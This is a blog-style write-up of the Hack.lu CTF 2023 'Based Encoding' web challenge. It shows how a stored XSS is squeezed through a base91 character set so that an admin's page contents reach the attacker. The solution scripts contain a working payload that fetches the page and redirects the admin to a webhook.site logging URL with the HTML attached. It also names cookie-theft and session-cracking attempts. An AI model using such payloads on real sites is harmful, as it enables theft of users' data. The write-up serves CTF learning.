---
layout: post
title: "Hack.lu CTF based encoding web challenge writeup"
date: 2023-10-19 07:30:00 +0100
categories: ctf web security writeup htmx
permalink: /posts/ctf-hack-lu-web-based-encoding
---

## Based Encoding

CTF name: **[Hack.lu CTF 2023](https://flu.xxx/info)**

Challenge name: **Based Encoding**

Challenge description:

```text
Based encoding as a service. But can we insert a little tomfoolery? Let's find out.
```

Challenge category: **web**

Challenge points: **82**

When: **Fri, Oct. 13, 18:00 — Sun, Oct. 15, 18:00 UTC**

### TLDR - solution

report a `base91` encoded _note_ to admin (**XSS** with limited character set)

```python
# btoa("https://webhook.site/your-server?data=") ==> aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=

script="<script>fetch(\"/\")[\"then\"]((data) => data[\"text\"]())[\"then\"]((html)=>location=atob(\"aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=\")+btoa(html))</script><p>some tag</p>"
result = based91.decode(script)
print(result.hex())

# f0afecd5baf39dac4294fc6dd286f809445ffb0db053e0adb4964677a7ca80e53c0b26c6157004c3e127107ded37c04e814160531bdd758d4365402d67b83360700a022f45a3cc14aa343a2acff513e49aa6e1436fa0ee472443f8433165989534423bd308ede71d1128b3cde436c4dfa9ccad5f10d8d4e0f08f0651410c054aedf14de6a0d55a22d9dcce
```

### Description

![description](/assets/images/2023-10-19/image-1.png)

Challenge was marked as **beginner friendly**. You're greet with a login page. After signing up you get an access to list, create and report (to admin) _encodings_

| login                                              | create                                               | view                                               | list                                                    |
| -------------------------------------------------- | ---------------------------------------------------- | -------------------------------------------------- | ------------------------------------------------------- |
| ![login page](/assets/images/2023-10-19/image.png) | ![create encoding](/assets/images/2023-10-19/t1.png) | ![view encoding](/assets/images/2023-10-19/t2.png) | ![list all encodings](/assets/images/2023-10-19/t3.png) |

After checking the source code and `view_encoding.html` file we can see that it's vulnerable to XSS

![Alt text](/assets/images/2023-10-19/image-5.png)

Inside the `app.py` file you find a flag. It's in a database, but only admin knows the id. So the idea is to prepare an encoding with some XSS, report it to the admin, and steal the id and get the flag 😉

![Alt text](/assets/images/2023-10-19/image-7.png)

Our `XSS` script will be encoded using `base91` which means we're limited to the `base91_alphabet`. Other characters will be lost during encoding process

![Alt text](/assets/images/2023-10-19/image-6.png)

Let's analyze the most important file of this challenge. Inside the `app.py` there's the `/create` function where we find the encoding logic

```python
encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
```

First observation is that you can send encodings as a `.hex()`. Second is that encoding a decoded value will give you the same value (but again, we're limited to the `base91_alphabet`)

```python
result = based91.encode(based91.decode('YOUR_EVIL_SCRIPT_but_._and_ _spaces_ _are_missing'))
print (result)

# YOUR_EVIL_SCRIPT_but__and__spaces__are_missisB
```

Now it's time to prepare a JS script which will steal the admin decodings. Remember we can't use spaces and `.` so we need to access the object using `[]`. Let's fetch `/`, then redirect a user to our server with the page data as a query parameter. We used [webhook.site](https://webhook.site) as a temporary log server

```javascript
// btoa("https://webhook.site/your-server?data=") ==> aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=

fetch("/")
  ["then"]((data) => data["text"]())
  ["then"](
    (html) =>
      (location =
        atob("aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=") +
        btoa(html))
  );
```

Now it's time to decode and parse it to hex. Have you noticed these trash characters from before? We've got `missisB` instead of `missing`. It may break our closing `</script>` tag. We'll get rid of this issue by simply adding some random tag at the end of the script

```python
import based91
script="<script>fetch(\"/\")[\"then\"]((data) => data[\"text\"]())[\"then\"]((html)=>location=atob(\"aHR0cHM6Ly93ZWJob29rLnNpdGUveW91ci1zZXJ2ZXI/ZGF0YT0=\")+btoa(html))</><p>some tag</p>"
result = based91.decode(script)
print(result.hex())

# f0afecd5baf39dac4294fc6dd286f809445ffb0db053e0adb4964677a7ca80e53c0b26c6157004c3e127107ded37c04e814160531bdd758d4365402d67b83360700a022f45a3cc14aa343a2acff513e49aa6e1436fa0ee472443f8433165989534423bd308ede71d1128b3cde436c4dfa9ccad5f10d8d4e0f08f0651410c054aedf14de6a0d55a22d9dcce
```

Now it's time to create an encoding. We can see the redirect is working (we're redirected after creating this decoding). Let's grab an id, report it to admin and check our log server

![Alt text](/assets/images/2023-10-19/image-8.png)

And we've got something! Let's decode the data

![Alt text](/assets/images/2023-10-19/image-9.png)

And here's the id! Let's go back to the challenge page, open random decoding and replace the id url parameter

![Alt text](/assets/images/2023-10-19/image-10.png)

so the `flag` is

```text
flag{bas3d_enc0dings_str1p_off_ur_sk1n}
```

### wrong path 1

Trying to steal an admin cookie which was protected by `httpOnly` flag and not accessible via `document.cookie` from the FE

![http only cookie flag](/assets/images/2023-10-19/image-2.png)

### wrong path 2

Trying with different versions of `eval` with the `no-eval` policy in place

![content security policy](/assets/images/2023-10-19/image-3.png)

### wrong path 3

Decoding `session` using [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) and [flask-unsign-wordlist](https://github.com/Paradoxis/Flask-Unsign-Wordlist). Secret is long, random so nearly impossible to crack

![flask-unsign-result](/assets/images/2023-10-19/image-4.png)

{% include posts_footer.html %}
